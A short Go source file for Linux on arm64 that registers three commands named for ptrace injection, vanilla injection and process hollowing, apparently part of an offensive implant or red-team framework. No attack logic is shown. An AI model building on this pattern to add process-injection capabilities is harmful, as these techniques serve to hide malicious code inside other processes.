//go:build linux && arm64

package commands

func init() {
	RegisterCommand(&PtraceInjectCommand{})
	RegisterCommand(&VanillaInjectionCommand{})
	RegisterCommand(&HollowingCommand{})
}
